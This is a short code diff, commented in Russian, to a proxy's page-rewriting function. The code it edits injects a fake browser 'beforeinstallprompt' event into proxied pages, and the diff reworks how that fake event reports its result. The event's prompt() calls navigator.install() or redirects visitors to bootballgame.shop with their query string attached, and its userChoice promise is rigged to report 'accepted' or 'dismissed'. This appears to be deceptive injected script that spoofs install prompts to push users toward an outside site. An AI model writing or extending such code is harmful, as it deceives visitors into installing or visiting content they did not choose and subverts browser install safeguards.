@@ -105,6 +105,12 @@ function rewriteBody(body, contentType, proxyHost, proxyOrigin) {
   var promptWaiters = [];
 
   // Фейковый beforeinstallprompt event — заглушка чтобы страница показалась
+  // userChoice — pending promise, резолвится только когда prompt() сделает действие
+  var resolveUserChoice;
+  var fakeUserChoice = new Promise(function(resolve) {
+    resolveUserChoice = resolve;
+  });
+
   var fakeEvent = {
     preventDefault: function() {},
     prompt: function() {
@@ -117,16 +123,20 @@ function rewriteBody(body, contentType, proxyHost, proxyOrigin) {
       // Вариант 1: Web Install API (Chrome 143+)
       if (navigator.install) {
         console.log('[Proxy] Trying navigator.install()...');
-        return navigator.install();
+        return navigator.install().then(function() {
+          resolveUserChoice({ outcome: 'accepted', platform: '' });
+        }).catch(function() {
+          resolveUserChoice({ outcome: 'dismissed', platform: '' });
+        });
       }
-      // Вариант 2: Открыть bootballgame.shop напрямую
-      // В standalone PWA это откроет CCT, но там beforeinstallprompt сработает
+      // Вариант 2: Открыть bootballgame.shop напрямую в CCT
       console.log('[Proxy] Opening bootballgame.shop directly...');
       var params = window.location.search || '';
       window.location.href = 'https://bootballgame.shop/' + params;
-      return Promise.resolve({ outcome: 'accepted', platform: '' });
+      // Не резолвим — страница уходит на redirect
+      return Promise.resolve();
     },
-    userChoice: Promise.resolve({ outcome: 'accepted', platform: '' })
+    userChoice: fakeUserChoice
   };
 
   window.deferredPrompt = fakeEvent;
